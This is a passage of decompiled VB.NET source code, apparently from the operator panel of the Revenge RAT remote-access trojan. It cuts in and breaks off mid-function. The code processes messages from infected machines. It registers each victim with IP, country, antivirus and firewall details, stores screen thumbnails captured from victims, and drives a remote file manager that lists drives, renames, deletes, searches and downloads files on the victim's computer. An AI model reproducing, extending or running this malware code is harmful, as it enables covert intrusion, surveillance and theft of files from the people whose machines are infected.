                        End Try
                        item.SubItems.Add("0.3")
                        Try
                            item.SubItems.Add(strArray(11))
                        Catch exception20 As Exception
                            ProjectData.SetProjectError(exception20)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        item.SubItems.Add("...")
                        Try
                            NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(12)))}, Nothing, Nothing, Nothing, True)
                        Catch exception21 As Exception
                            ProjectData.SetProjectError(exception21)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            NewLateBinding.LateCall(item.SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(13)))}, Nothing, Nothing, Nothing, True)
                        Catch exception22 As Exception
                            ProjectData.SetProjectError(exception22)
                            item.SubItems.Add("????")
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            If Conversions.ToBoolean(strArray(14)) Then
                                item.ForeColor = Color.FromArgb(&HE2, &H68, &H26)
                                item.UseItemStyleForSubItems = True
                            ElseIf (strArray(14) = "RVUS") Then
                                item.ForeColor = Color.FromArgb(&H37, &H45, &HB3)
                                item.UseItemStyleForSubItems = True
                            End If
                        Catch exception23 As Exception
                            ProjectData.SetProjectError(exception23)
                            ProjectData.ClearProjectError()
                        End Try
                        item.SubItems.Add("....")
                        item.Tag = "0"
                        Try
                            If (Me.BlockedIp.Items.Count > 0) Then
                                Dim enumerator As IEnumerator
                                Try
                                    enumerator = Me.BlockedIp.Items.GetEnumerator
                                    Do While enumerator.MoveNext
                                        Dim item3 As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                        If (item3.SubItems.Item(0).Text = Me.s.IP(sock)) Then
                                            Return
                                        End If
                                    Loop
                                Finally
                                End Try
                            End If
                            Dim item2 As ListViewItem = Me.Logs.Items.Add(sock.ToString, String.Concat(New String() {"[ ", Conversions.ToString(DateAndTime.TimeValue(Conversions.ToString(DateAndTime.Now))), " ] IP : ", Me.s.IP(sock), " - Server ID : ", [text]}), imageIndex)
                            item2.SubItems.Add("Online").ForeColor = Color.Green
                            item2.ForeColor = Color.Green
                            item2.ToolTipText = (Me.GeoIP.LookupCountryName(Me.s.IP(sock)) & ".png")
                        Catch exception24 As Exception
                            ProjectData.SetProjectError(exception24)
                            ProjectData.ClearProjectError()
                        End Try
                    End SyncLock
                    If Me.VIS Then
                        Dim mainForm As New Notification
                        Try
                            mainForm.Label5.Text = ("Identifier  : " & [text])
                        Catch exception25 As Exception
                            ProjectData.SetProjectError(exception25)
                            mainForm.Label5.Text = "Identifier  : ????"
                            ProjectData.ClearProjectError()
                        End Try
                        Try
                            mainForm.Label2.Text = (" Location   : " & Me.GeoIP.LookupCountryName(Me.s.IP(sock)))
                        Catch exception26 As Exception
                            ProjectData.SetProjectError(exception26)
                            mainForm.Label2.Text = " Location   : ????"
                            ProjectData.ClearProjectError()
                        End Try
                        Dim point2 As New Point((My.Computer.Screen.Bounds.Width - &H133), CInt(Math.Round(CDbl(((My.Computer.Screen.Bounds.Height + 132.5) - 240)))))
                        mainForm.Location = point2
                        mainForm.StartPosition = FormStartPosition.Manual
                        mainForm.BackColor = XylosTabControl.CCB
                        mainForm.Label2.BackColor = XylosTabControl.CCB
                        mainForm.Label3.BackColor = XylosTabControl.CCB
                        mainForm.Label5.BackColor = XylosTabControl.CCB
                        mainForm.Label6.BackColor = XylosTabControl.CCB
                        mainForm.TopMost = True
                        mainForm.TopLevel = True
                        Application.Run(mainForm)
                    Else
                        Me.ReIcon.ShowBalloonTip(1, ("New Client Connected From : " & ChrW(13) & ChrW(10) & Me.GeoIP.LookupCountryName(Me.s.IP(sock))), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Client Identifier : ", SocketServer.Decode(strArray(1))), SocketServer.Decode(strArray(2))), ChrW(13) & ChrW(10)), "Client IP : "), Me.s.IP(sock))), ToolTipIcon.None)
                    End If
                    Return
                Case Else
                    If (str13 <> "GP") Then
                        GoTo Label_15C6
                    End If
                    If (Me.Startc.Text <> "Stop") Then
                        Return
                    End If
                    Try
                        Dim thumb As ImageList = Me.Thumb
                        SyncLock thumb
                            Dim tH As LIM = Me.TH
                            SyncLock tH
                                Dim enumerator4 As IEnumerator
                                Try
                                    enumerator4 = Me.Listview1.Items.GetEnumerator
                                    Do While enumerator4.MoveNext
                                        Dim item6 As ListViewItem = DirectCast(enumerator4.Current, ListViewItem)
                                        If (item6.ToolTipText = strArray(2)) Then
                                            Dim enumerator5 As IEnumerator
                                            Dim bytes As Byte() = Convert.FromBase64String(strArray(1))
                                            File.WriteAllBytes(String.Concat(New String() {Application.StartupPath, "\Users\", item6.SubItems.Item(1).Text, "\Thumbnails\", DateTime.Now.ToString("yyyy-MM-dd"), "_", DateAndTime.TimeOfDay.ToString("h-mm-ss tt"), ".png"}), bytes)
                                            item6.SubItems.Item(15).Text = Conversions.ToString(sock)
                                            Me.Thumb.Images.Add(item6.ToolTipText, New Bitmap(String.Concat(New String() {Application.StartupPath, "\Users\", item6.SubItems.Item(1).Text, "\Thumbnails\", DateTime.Now.ToString("yyyy-MM-dd"), "_", DateAndTime.TimeOfDay.ToString("h-mm-ss tt"), ".png"})))
                                            Me.Thumb.Images.RemoveByKey(item6.ToolTipText)
                                            Try
                                                enumerator5 = Me.TH.Items.GetEnumerator
                                                Do While enumerator5.MoveNext
                                                    Dim item7 As ListViewItem = DirectCast(enumerator5.Current, ListViewItem)
                                                    If (item7.ToolTipText = strArray(2)) Then
                                                        If Operators.ConditionalCompareObjectEqual(item7.Tag, Nothing, False) Then
                                                            item7.Tag = String.Concat(New String() {"Location : ", item6.SubItems.Item(0).Text, " - ", item6.SubItems.Item(14).Text, ChrW(13) & ChrW(10) & "Identifier : ", item6.SubItems.Item(1).Text, ChrW(13) & ChrW(10) & "IP Address : ", item6.SubItems.Item(2).Text, ChrW(13) & ChrW(10) & "Operating System : ", item6.SubItems.Item(5).Text, ChrW(13) & ChrW(10) & "Computer / User : ", item6.SubItems.Item(3).Text, ChrW(13) & ChrW(10) & "Antivirus : ", item6.SubItems.Item(8).Text, ChrW(13) & ChrW(10) & "Firewall : ", item6.SubItems.Item(9).Text})
                                                        End If
                                                        item7.Name = Conversions.ToString(sock)
                                                        Exit Do
                                                    End If
                                                Loop
                                            Finally
                                            End Try
                                            Exit Do
                                        End If
                                    Loop
                                Finally

                                End Try
                            End SyncLock
                        End SyncLock
                    Catch exception29 As Exception
                    End Try
                    Exit Select
            End Select
            Me.TH.Refresh()
            Return
Label_15C6:
            Select Case str13
                Case "RD"
                    Dim manager3 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(3))), FileManager)
                    manager3.ToolStripStatusLabel1.Text = Conversions.ToString(Operators.ConcatenateObject(strArray(1), SocketServer.Decode(strArray(2))))
                    If strArray(1).Contains("successfully") Then
                        Dim enumerator6 As IEnumerator
                        Try
                            enumerator6 = manager3.Files.Items.GetEnumerator
                            Do While enumerator6.MoveNext
                                Dim item8 As ListViewItem = DirectCast(enumerator6.Current, ListViewItem)
                                If Operators.ConditionalCompareObjectEqual(item8.SubItems.Item(0).Text, SocketServer.Decode(strArray(4)), False) Then
                                    item8.Remove()
                                End If
                            Loop
                        Finally
                        End Try
                    End If
                    Return
                Case "ResultA"
                    Dim manager4 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(5))), FileManager)
                    manager4.ToolStripStatusLabel1.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(strArray(1), SocketServer.Decode(strArray(2))), strArray(3)), SocketServer.Decode(strArray(4))))
                    If strArray(1).Contains("successfully") Then
                        Dim enumerator7 As IEnumerator
                        Try
                            enumerator7 = manager4.Files.Items.GetEnumerator
                            Do While enumerator7.MoveNext
                                Dim item9 As ListViewItem = DirectCast(enumerator7.Current, ListViewItem)
                                If Operators.ConditionalCompareObjectEqual(item9.SubItems.Item(0).Text, SocketServer.Decode(strArray(6)), False) Then
                                    item9.SubItems.Item(0).Text = Conversions.ToString(SocketServer.Decode(strArray(4)))
                                End If
                            Loop
                        Finally
                        End Try
                    End If
                    Return
                Case "Drivers"
                    If Me.InvokeRequired Then
                        Dim method As _data = New _data(AddressOf Me.data)
                        Me.Invoke(method, New Object() {sock, b})
                    Else
                        Dim manager5 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                        Dim strArray2 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), " | ", -1, CompareMethod.Binary)
                        Dim num2 As Integer = 0
                        Try
                            Dim enumerator8 As IEnumerator
                            Try
                                enumerator8 = manager5.Fxtrv1.Nodes.GetEnumerator
                                Do While enumerator8.MoveNext
                                    Dim node As TreeNode = DirectCast(enumerator8.Current, TreeNode)
                                    If (node.Text = "My Computer") Then
                                        Dim num50 As Integer = (strArray2.Length - 2)
                                        Dim i As Integer = 0
                                        Do While (i <= num50)
                                            If (My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))) Is Nothing) Then
                                                Exit Do
                                            End If
                                            If (((strArray2(i).Length <> 0) Or (strArray2((i + 1)).Length = 0)) Or (strArray2((i + 2)).Length = 0)) Then
                                                Try
                                                    If strArray2((i + 1)).Contains("System") Then
                                                        manager5.Fxtrv1.Nodes.Item(node.Index).Nodes.Add(strArray2(i), strArray2(i), 9, 9).ToolTipText = strArray2((i + 2))
                                                    ElseIf strArray2((i + 2)).Contains("[Fixed]") Then
                                                        manager5.Fxtrv1.Nodes.Item(node.Index).Nodes.Add(strArray2(i), strArray2(i), 10, 10).ToolTipText = strArray2((i + 2))
                                                    ElseIf strArray2((i + 2)).Contains("[CDRom]") Then
                                                        manager5.Fxtrv1.Nodes.Item(node.Index).Nodes.Add(strArray2(i), strArray2(i), 11, 11).ToolTipText = strArray2((i + 2))
                                                    ElseIf strArray2((i + 2)).Contains("[Removable]") Then
                                                        manager5.Fxtrv1.Nodes.Item(node.Index).Nodes.Add(strArray2(i), strArray2(i), 12, 12).ToolTipText = strArray2((i + 2))
                                                    ElseIf strArray2((i + 2)).Contains("[Network]") Then
                                                        manager5.Fxtrv1.Nodes.Item(node.Index).Nodes.Add(strArray2(i), strArray2(i), 13, 13).ToolTipText = strArray2((i + 2))
                                                    Else
                                                        manager5.Fxtrv1.Nodes.Item(node.Index).Nodes.Add(strArray2(i), strArray2(i), 14, 14).ToolTipText = strArray2((i + 2))
                                                    End If
                                                    num2 += 1
                                                Catch exception30 As Exception
                                                    ProjectData.SetProjectError(exception30)
                                                    ProjectData.ClearProjectError()
                                                End Try
                                                i = (i + 2)
                                            End If
                                            i += 1
                                        Loop
                                        manager5.Fxtrv1.Nodes.Item(1).ExpandAll()
                                    End If
                                Loop
                            Finally
                            End Try
                        Catch exception31 As Exception
                        End Try
                        manager5.ToolStripStatusLabel4.Text = ("Drives : " & Conversions.ToString(num2) & " -")
                    End If
                    Return
                Case "Files"
                    If Me.InvokeRequired Then
                        Dim _data3 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data3, New Object() {sock, b})
                    Else
                        Dim manager6 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                        Dim str4 As String = Conversions.ToString(clsCompressedString.Decode(strArray(1)))
                        Dim strArray3 As String() = Strings.Split(str4, "*Files*", -1, CompareMethod.Binary)
                        If (((((str4.Contains(".tiff") Or str4.Contains(".jpg")) Or str4.Contains(".png")) Or str4.Contains(".jpeg")) Or str4.Contains(".bmp")) Or str4.Contains(".gif")) Then
                            manager6.ThumbnailsToolStripMenuItem.Enabled = True
                        Else
                            manager6.ThumbnailsToolStripMenuItem.Enabled = False
                        End If
                        Try
                            If Not Directory.Exists((Interaction.Environ("Temp") & "\RevengeRATFM\")) Then
                                Directory.CreateDirectory((Interaction.Environ("Temp") & "\RevengeRATFM\"))
                            End If
                        Catch exception32 As Exception
                        End Try
                        Dim num51 As Integer = (strArray3.Length - 2)
                        Dim j As Integer = 0
                        Do While (j <= num51)
                            Try
                                Dim obj2 As Object
                                If Not manager6.ImageList1.Images.ContainsKey(strArray3((j + 2))) Then
                                    If Not File.Exists((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray3((j + 2)) & ".ico")) Then
                                        File.Create(String.Concat(New String() {Interaction.Environ("Temp"), "\RevengeRATFM\", strArray3((j + 2)), " File.", strArray3((j + 2))})).Close()
                                        Dim icon As Icon = Icon.ExtractAssociatedIcon(String.Concat(New String() {Interaction.Environ("Temp"), "\RevengeRATFM\", strArray3((j + 2)), " File.", strArray3((j + 2))}))
                                        Dim icon3 As SingleIcon = New MultiIcon().Add(strArray3((j + 2)))
                                        icon3.CreateFrom(icon.ToBitmap, IconOutputFormat.Vista)
                                        icon3.Save((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray3((j + 2)) & ".ico"))
                                        manager6.ImageList1.Images.Add(strArray3((j + 2)), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray3((j + 2)) & ".ico")))
                                    Else
                                        manager6.ImageList1.Images.Add(strArray3((j + 2)), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray3((j + 2)) & ".ico")))
                                    End If
                                End If
                                If (strArray3((j + 2)) = Nothing) Then
                                    obj2 = manager6.Files.Items.Add(strArray3(j), 1)
                                Else
                                    obj2 = manager6.Files.Items.Add(strArray3((j + 2)), strArray3(j), strArray3((j + 2)))
                                End If
                                objArray = New Object(1 - 1) {}
                                strArray44 = strArray3
                                num52 = (j + 1)
                                objArray(0) = strArray44(num52)
                                objArray2 = objArray
                                flagArray = New Boolean() {True}
                                NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray2, Nothing, Nothing, flagArray, True)
                                If flagArray(0) Then
                                    strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray2(0)), GetType(String)))
                                End If
                                NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", New Object() {(strArray3((j + 2)) & " File")}, Nothing, Nothing, Nothing, True)
                                objArray2 = New Object(1 - 1) {}
                                strArray44 = strArray3
                                num52 = (j + 3)
                                objArray2(0) = strArray44(num52)
                                objArray = objArray2
                                flagArray = New Boolean() {True}
                                NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                If flagArray(0) Then
                                    strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                End If
                                objArray2 = New Object(1 - 1) {}
                                strArray44 = strArray3
                                num52 = (j + 4)
                                objArray2(0) = strArray44(num52)
                                objArray = objArray2
                                flagArray = New Boolean() {True}
                                NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                If flagArray(0) Then
                                    strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                End If
                                objArray2 = New Object(1 - 1) {}
                                strArray44 = strArray3
                                num52 = (j + 5)
                                objArray2(0) = strArray44(num52)
                                objArray = objArray2
                                flagArray = New Boolean() {True}
                                NewLateBinding.LateCall(NewLateBinding.LateGet(obj2, Nothing, "SubItems", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "Add", objArray, Nothing, Nothing, flagArray, True)
                                If flagArray(0) Then
                                    strArray44(num52) = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray(0)), GetType(String)))
                                End If
                                j = (j + 5)
                            Catch exception33 As Exception
                                ProjectData.SetProjectError(exception33)
                                Dim item10 As ListViewItem = manager6.Files.Items.Add(strArray3(j), 1)
                                item10.SubItems.Add(strArray3((j + 1)))
                                item10.SubItems.Add((strArray3((j + 2)) & " File"))
                                item10.SubItems.Add(strArray3((j + 3)))
                                item10.SubItems.Add(strArray3((j + 4)))
                                item10.SubItems.Add(strArray3((j + 5)))
                                item10.Tag = strArray3((j + 2))
                                j = (j + 5)
                            End Try
                            j += 1
                        Loop
                        Try
                            manager6.Files.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        Catch exception34 As Exception
                        End Try
                    End If
                    Return
                Case "Result"
                    Dim manager2 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(3))), FileManager)
                    If Not manager2.Pathloc.Enabled Then
                        manager2.Pathloc.Enabled = True
                    End If
                    If (strArray(1) = "Disks found") Then
                        manager2.Fxtrv1.Enabled = True
                        manager2.En.Enabled = True
                        manager2.Re.Enabled = True
                        manager2.ToolStripStatusLabel1.Text = "Disks found"
                        manager2.ToolStripStatusLabel1.ForeColor = Color.FromArgb(150, 150, 150)
                    ElseIf (strArray(1) = "Could not get disks") Then
                        manager2.Fxtrv1.Enabled = True
                        manager2.En.Enabled = True
                        manager2.Re.Enabled = True
                        manager2.ToolStripStatusLabel1.Text = "Could not get disks"
                        manager2.ToolStripStatusLabel1.ForeColor = Color.FromArgb(150, 150, 150)
                    ElseIf (strArray(1) = "Please wait a momment ...") Then
                        manager2.Files.Enabled = False
                        manager2.Fxtrv1.Enabled = False
                        manager2.En.Enabled = False
                        manager2.Re.Enabled = False
                        manager2.ToolStripStatusLabel1.Text = "Please wait a moment ..."
                        manager2.ToolStripStatusLabel1.ForeColor = Color.FromArgb(150, 150, 150)
                    ElseIf (strArray(1) = "File list successfully created") Then
                        manager2.Files.Enabled = True
                        manager2.Fxtrv1.Enabled = True
                        manager2.En.Enabled = True
                        manager2.Re.Enabled = True
                        manager2.Pathloc.Enabled = True
                        manager2.ToolStripStatusLabel1.Text = "File list successfully created"
                        manager2.ToolStripStatusLabel1.ForeColor = Color.FromArgb(150, 150, 150)
                    ElseIf (strArray(1) = "ERR : ") Then
                        manager2.Files.Enabled = True
                        manager2.Fxtrv1.Enabled = True
                        manager2.En.Enabled = True
                        manager2.Re.Enabled = True
                        manager2.Pathloc.Enabled = True
                        If (manager2.Files.Items.Count > 1) Then
                            manager2.ToolStripStatusLabel1.Text = "File list successfully created"
                        Else
                            manager2.ToolStripStatusLabel3.Text = "-"
                            manager2.ToolStripStatusLabel2.Text = "-"
                            manager2.ToolStripStatusLabel1.Text = "Could not get files or directorys"
                            manager2.ToolStripStatusLabel1.ForeColor = Color.IndianRed
                        End If
                    Else
                        manager2.Files.Enabled = True
                        manager2.Fxtrv1.Enabled = True
                        manager2.En.Enabled = True
                        manager2.Re.Enabled = True
                        manager2.Pathloc.Enabled = True
                        manager2.ToolStripStatusLabel1.Text = Conversions.ToString(Operators.ConcatenateObject(strArray(1), SocketServer.Decode(strArray(2))))
                        manager2.ToolStripStatusLabel1.ForeColor = Color.FromArgb(150, 150, 150)
                    End If
                    Return
                Case "OpenFileManager"
                    If (Not My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))) Is Nothing) Then
                        Me.s.Send(Conversions.ToInteger(strArray(2)), "Abort")
                    ElseIf Me.InvokeRequired Then
                        Dim _data As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data, New Object() {sock, b})
                    Else
                        Dim manager As New FileManager
                        manager.sock = sock
                        manager.Name = ("OpenFileManager" & strArray(2))
                        manager.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("File Manager : ", SocketServer.Decode(strArray(1))), " - "), Me.s.IP(sock)))
                        manager.Path = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((Application.StartupPath & "\Users\"), SocketServer.Decode(strArray(1))), "\Downloads\"))
                        manager.Show()
                    End If
                    Return
                Case Else
                    If (str13 <> "Directory") Then
                        GoTo Label_2B7C
                    End If
                    If Me.InvokeRequired Then
                        Dim _data4 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data4, New Object() {sock, b})
                        Return
                    End If
                    manager7 = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                    Dim strArray4 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "*DIRS*", -1, CompareMethod.Binary)
                    Dim num53 As Integer = (strArray4.Length - 2)
                    Dim k As Integer = 0
                    Do While (k <= num53)
                        If ((Not My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))) Is Nothing) AndAlso Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(3)), manager7.Pathloc.Text, False)) Then
                            Dim item11 As ListViewItem = manager7.Files.Items.Add(strArray4(k), 0)
                            item11.SubItems.Add("File Folder")
                            item11.SubItems.Add("Directory")
                            item11.SubItems.Add(strArray4((k + 1)))
                            item11.SubItems.Add(strArray4((k + 2)))
                            item11.SubItems.Add(strArray4((k + 3)))
                            item11.SubItems.Add(strArray4((k + 4)))
                            k = (k + 3)
                        Else
                            Exit Do
                        End If
                        k += 1
                    Loop
                    Exit Select
            End Select
            Try
                manager7.Files.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
            Catch exception35 As Exception
            End Try
            Return
Label_2B7C:
            Select Case str13
                Case "viewimage"
                    Try
                        Dim manager10 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                        manager10.ImageList3.Images.Add(Conversions.ToString(SocketServer.Decode(strArray(3))), New Bitmap(Image.FromStream(New MemoryStream(Convert.FromBase64String(strArray(1))))))
                        Dim item12 As ListViewItem = DirectCast(NewLateBinding.LateGet(manager10.Lim1.Items, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3))), RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3))), RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing), ListViewItem)
                        item12.Tag = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Thumbnail Name : ", SocketServer.Decode(strArray(3))), ChrW(13) & ChrW(10)), ChrW(13) & ChrW(10)), "Thumbnail Path : "), SocketServer.Decode(strArray(4))), ChrW(13) & ChrW(10)), ChrW(13) & ChrW(10)), "Thumbnail Size : "), SocketServer.GetSize(Conversions.ToULong(strArray(5))))
                    Catch exception37 As Exception
                    End Try
                    Try
                        Dim manager11 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                        manager11.ToolStripStatusLabel5.Text = "Total items ( 0 )".Replace("0", Conversions.ToString(manager11.Lim1.Items.Count))
                    Catch exception38 As Exception
                    End Try
                    Return
                Case "Search"
                    Dim manager12 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                    manager12.StartS.Enabled = True
                    manager12.SPath.Enabled = True
                    manager12.FileName.Enabled = True
                    manager12.ToolStripStatusLabel6.Text = "Search files list successfully created"
                    manager12.SearchFiles.Enabled = True
                    Return
                Case "SDIR"
                    If Me.InvokeRequired Then
                        Dim _data5 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data5, New Object() {sock, b})
                    Else
                        Dim manager13 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                        Dim strArray5 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "DPFM", -1, CompareMethod.Binary)
                        Dim num54 As Integer = (strArray5.Length - 2)
                        Dim m As Integer = 0
                        Do While (m <= num54)
                            manager13.SearchFiles.Items.Add(strArray5(m), 0).SubItems.Add("Null")
                            m += 1
                        Loop
                        Try
                            manager13.SearchFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        Catch exception39 As Exception
                        End Try
                    End If
                    Return
                Case "SFIL"
                    If Me.InvokeRequired Then
                        Dim _data6 As _data = New _data(AddressOf Me.data)
                        Me.Invoke(_data6, New Object() {sock, b})
                    Else
                        Dim manager14 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                        Dim strArray6 As String() = Strings.Split(Conversions.ToString(clsCompressedString.Decode(strArray(1))), "|*|", -1, CompareMethod.Binary)
                        If Not Directory.Exists((Interaction.Environ("Temp") & "\RevengeRATFM\")) Then
                            Directory.CreateDirectory((Interaction.Environ("Temp") & "\RevengeRATFM\"))
                        End If
                        Dim num55 As Integer = (strArray6.Length - 2)
                        Dim n As Integer = 0
                        Do While (n <= num55)
                            If (strArray6((n + 2)) = Nothing) Then
                                manager14.SearchFiles.Items.Add(strArray6(n), 1).SubItems.Add(strArray6((n + 1)))
                            Else
                                If File.Exists((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray6((n + 2)) & ".ico")) Then
                                    manager14.ImageList1.Images.Add(strArray6((n + 2)), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray6((n + 2)) & ".ico")))
                                Else
                                    Try
                                        File.Create(String.Concat(New String() {Interaction.Environ("Temp"), "\RevengeRATFM\", strArray6((n + 2)), " File.", strArray6((n + 2))})).Close()
                                        Dim icon4 As Icon = Icon.ExtractAssociatedIcon(String.Concat(New String() {Interaction.Environ("Temp"), "\RevengeRATFM\", strArray6((n + 2)), " File.", strArray6((n + 2))}))
                                        Dim icon6 As SingleIcon = New MultiIcon().Add(strArray6((n + 2)))
                                        icon6.CreateFrom(icon4.ToBitmap, IconOutputFormat.Vista)
                                        icon6.Save((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray6((n + 2)) & ".ico"))
                                        manager14.ImageList1.Images.Add(strArray6((n + 2)), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & strArray6((n + 2)) & ".ico")))
                                    Catch exception40 As Exception
                                        ProjectData.SetProjectError(exception40)
                                        manager14.ImageList1.Images.Add(strArray6((n + 2)), New Bitmap(manager14.ImageList1.Images.Item(1)))
                                        ProjectData.ClearProjectError()
                                    End Try
                                End If
                                manager14.SearchFiles.Items.Add(strArray6((n + 2)), strArray6(n), strArray6((n + 2))).SubItems.Add(strArray6((n + 1)))
                            End If
                            n = (n + 2)
                            n += 1
                        Loop
                        Try
                            manager14.SearchFiles.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
                        Catch exception41 As Exception
                        End Try
                    End If
                    Return
                Case "GRFIF"
                    Dim manager15 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(2))), FileManager)
                    manager15.R = strArray(1)
                    Thread.Sleep(&H7D0)
                    manager15.ListView2.Items.Clear()
                    Me.s.Send(sock, ("Getrarfilesinside" & Me.Key & strArray(1)))
                    Return
                Case "Getrarfilesinside"
                    Dim manager16 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(4))), FileManager)
                    If Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(2)), "D", False) Then
                        manager16.ListView2.Items.Add(Conversions.ToString(SocketServer.Decode(strArray(1))), 0).SubItems.Add("File Folder")
                    ElseIf Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(2)), "F", False) Then
                        NewLateBinding.LateCall(manager16.ListView2.Items.Add(Conversions.ToString(SocketServer.Decode(strArray(1))), 1).SubItems, Nothing, "Add", New Object() {RuntimeHelpers.GetObjectValue(SocketServer.Decode(strArray(3)))}, Nothing, Nothing, Nothing, True)
                    End If
                    Return
                Case "RARResult"
                    Dim manager17 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(1))), FileManager)
                    manager17.ListView2.Enabled = True
                    manager17.ToolStripStatusLabel7.Text = "File list successfully created"
                    manager17.GRF.Enabled = True
                    manager17.RF.Enabled = True
                    Me.s.Send(sock, "RARC")
                    Return
                Case "Download File"
                    Dim objectValue As Object
                    Dim manager18 As FileManager = DirectCast(My.Application.OpenForms.Item(("OpenFileManager" & strArray(1))), FileManager)
                    Dim flag As Boolean = False
                    If Operators.ConditionalCompareObjectEqual(SocketServer.Decode(strArray(4)), Nothing, False) Then
                        flag = True
                    ElseIf File.Exists(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((Interaction.Environ("Temp") & "\RevengeRATFM\"), SocketServer.Decode(strArray(4))), ".ico"))) Then
                        manager18.ImageList1.Images.Add(Conversions.ToString(SocketServer.Decode(strArray(4))), New Bitmap((Interaction.Environ("Temp") & "\RevengeRATFM\" & SocketServer.Decode(strArray(4)).ToString & ".ico")))
                    Else
                        Try
                            File.Create(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Interaction.Environ("Temp") & "\RevengeRATFM\"), SocketServer.Decode(strArray(4))), " File."), SocketServer.Decode(strArray(4))))).Close()
                            Dim icon7 As Icon = Icon.ExtractAssociatedIcon(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((Interaction.Environ("Temp") & "\RevengeRATFM\"), SocketServer.Decode(strArray(4))), " File."), SocketServer.Decode(strArray(4)))))
                            Dim instance As New MultiIcon
